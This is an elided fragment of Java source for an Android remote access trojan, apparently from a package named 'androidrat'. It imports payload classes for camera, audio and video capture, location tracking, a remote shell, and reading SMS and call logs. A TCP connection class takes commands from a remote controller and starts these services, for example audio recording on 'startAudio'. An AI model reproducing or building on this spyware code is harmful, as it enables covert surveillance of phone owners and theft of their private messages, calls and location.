...
import com.example.androidrat.Payloads.CameraPreview;
import com.example.androidrat.Payloads.audioManager;
import com.example.androidrat.Payloads.ipAddr;
import com.example.androidrat.Payloads.locationManager;
import com.example.androidrat.Payloads.newShell;
import com.example.androidrat.Payloads.readCallLogs;
import com.example.androidrat.Payloads.readSMS;
import com.example.androidrat.Payloads.vibrate;
import com.example.androidrat.Payloads.videoRecorder;
...
public class tcpConnection extends AsyncTask<String,Void,Void> {
    ...
    com.example.androidrat.Payloads.videoRecorder videoRecorder;
    com.example.androidrat.Payloads.readCallLogs readCallLogs;
        ...
        try {
            ...
            while ((line = in.readLine()) != null)
            {
                ...
                else if(line.equals("startAudio"))
                {
                    ...
                    Intent serviceIntent = new Intent(context, com.example.androidrat.Payloads.audioManager.class);
